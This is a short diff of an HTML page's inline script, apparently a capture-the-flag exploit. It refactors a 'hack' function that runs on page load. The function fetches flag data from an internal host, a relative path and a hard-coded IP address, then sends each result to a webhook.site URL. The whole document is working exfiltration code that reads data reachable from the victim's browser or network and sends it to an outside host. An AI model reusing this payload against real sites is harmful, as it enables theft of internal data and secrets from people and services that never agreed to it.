@@ -7,18 +7,14 @@
 </head>
 <body>
     <script>
-        async function hack(){
-        var result = await fetch("http://web:8001/flag");
-        var flag = await result.text();
-        fetch("https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/flag1="+flag);
-        result = await fetch("/flag");
-        flag = await result.text();
-        fetch("https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/flag2="+flag);
-        result = await fetch("http://91.107.157.58:8001/flag");
-        flag = await result.text();
-        fetch("https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/flag3="+flag);
+        async function hack(link,_id ){
+            var result = await fetch(link);
+            var flag = await result.text();
+            fetch("https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/flag"+_id+"="+flag);
         }
-        hack();
+        hack("http://web:8001/flag", "1");
+        hack("/flag", "2");
+        hack("http://91.107.157.58:8001/flag","3")
     </script>
 </body>
 </html>
